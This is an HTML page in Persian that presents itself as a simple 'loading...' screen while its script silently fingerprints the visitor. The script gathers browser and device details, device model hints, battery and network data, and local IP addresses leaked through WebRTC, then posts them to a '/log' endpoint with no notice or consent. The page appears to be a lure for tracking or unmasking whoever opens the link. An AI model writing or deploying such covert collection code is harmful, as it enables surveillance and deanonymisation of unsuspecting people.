<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>در حال بارگذاری...</title>
  <style>
    body, html { margin:0; padding:0; height:100%; background:#f0f2f5; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:Tahoma; overflow:hidden; }
    .loader { width:60px; height:60px; border:6px solid #e0e0e0; border-top:6px solid #007bff; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:20px; }
    .text { color:#555; font-size:16px; }
    @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="text">در حال بارگذاری...</div>

<script>
// صبر 2 ثانیه + اجرای بعد از لود کامل
window.addEventListener('load', () => {
  setTimeout(async () => {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    // تلاش برای دریافت Client Hints (در مرورگرهای پشتیبانی‌شده)
    async function getClientHints() {
      const hints = {};
      try {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          // درخواست فیلدهایی که می‌توانند شامل مدل شوند (در صورت پشتیبانی مرورگر)
          const values = await navigator.userAgentData.getHighEntropyValues([
            'platform',
            'platformVersion',
            'model',
            'uaFullVersion',
            'architecture',
            'fullVersionList'
          ]);
          hints.clientHintAvailable = true;
          hints.values = values;
          // بعضی پیاده‌سازی‌ها model را بازنمی‌گردانند؛ پس فقط در صورت وجود اضافه می‌شود
          if (values.model) hints.model = values.model;
        } else if (navigator.userAgentData) {
          // یک نسخهٔ ساده‌تر از userAgentData (بدون high-entropy)
          hints.clientHintAvailable = true;
          hints.brands = navigator.userAgentData.brands || navigator.userAgentData.uaList || null;
        } else {
          hints.clientHintAvailable = false;
        }
      } catch (e) {
        hints.clientHintError = String(e);
        hints.clientHintAvailable = false;
      }
      return hints;
    }

    // fallback ساده برای حدس مدل از داخل userAgent (غیرقابل‌اطمینان، ولی بعضی مواقع مفید)
    function guessModelFromUserAgent(ua) {
      if (!ua) return null;
      // چند الگوی معمول را تست می‌کنیم (فهرست ساده و نه کامل)
      const patterns = [
        /\b(SM-\w+|SM\w+|GT-\w+|GT\w+|Pixel\s\d+|Pixel-\w+|HUAWEI|HONOR|Poco[\sA-Za-z0-9-]+|Mi\s\d+|Redmi[\sA-Za-z0-9-]+|OPPO|OnePlus[\sA-Za-z0-9-]+|Vivo[\sA-Za-z0-9-]+)\b/i,
        /\b(Nexus\s\d+|Moto\s[GEMAX]+\d*|iPhone|iPad)\b/i,
        /\b(Samsung|Huawei|Xiaomi|OnePlus|Sony|LG|Motorola|Nokia)\s?([A-Za-z0-9-]+)?\b/i
      ];
      for (const p of patterns) {
        const m = ua.match(p);
        if (m) return m[0];
      }
      return null;
    }

    const clientHints = await getClientHints();
    const guessedModel = guessModelFromUserAgent(navigator.userAgent);

    const data = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      languages: navigator.languages,
      cookieEnabled: navigator.cookieEnabled,
      online: navigator.onLine,
      doNotTrack: navigator.doNotTrack,
      hardware: navigator.hardwareConcurrency + ' هسته',
      memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'نامشخص',
      network: conn ? {
        type: conn.effectiveType,
        downlink: conn.downlink + 'Mbps',
        rtt: conn.rtt + 'ms',
        saveData: conn.saveData
      } : 'نامشخص',
      battery: 'getBattery' in navigator ? await navigator.getBattery().then(b => ({
        level: (b.level * 100).toFixed(0) + '%',
        charging: b.charging
      })) : 'نامشخص',
      webrtc_ips: await getWebRTCIPs(),
      // فیلدی جدید: نتیجهٔ Client Hints و حدسِ مدل از userAgent
      clientHints: clientHints,
      guessedModelFromUserAgent: guessedModel
    };

    // ارسال با خطایابی
    try {
      const res = await fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        keepalive: true
      });
      console.log('ارسال شد (موبایل/دسکتاپ):', res.status);
    } catch (e) {
      console.error('خطا در ارسال (موبایل/دسکتاپ):', e);
    }
  }, 2000); // 2 ثانیه صبر
});

function getWebRTCIPs() {
  return new Promise(resolve => {
    const ips = new Set();
    let pc;
    try {
      pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
      pc.onicecandidate = e => {
        if (!e.candidate) return;
        const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (match) ips.add(match[1]);
      };
    } catch (err) {
      console.error('WebRTC خطا:', err);
    }
    setTimeout(() => {
      if (pc) pc.close();
      resolve([...ips]);
    }, 2500);
  });
}
</script>
</body>
</html>
